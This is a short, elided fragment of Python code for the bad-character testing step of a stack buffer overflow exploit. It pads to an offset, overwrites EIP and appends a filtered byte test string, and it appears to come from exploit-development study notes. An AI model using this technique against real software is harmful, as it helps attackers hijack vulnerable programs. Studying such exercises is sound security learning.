...
## replace those bad chars with nothing
...
payload = b"".join(
	...
	b"A" * offset,
	new_eip,
	all_chars, ## add all_chars here ... which will exclude bad_chars
	b"C" * (lenght - len(new_eip) - offset - len(all_chars)), ## ALLWAYS DECREASE IF ADDING SOMETHING
	]
)
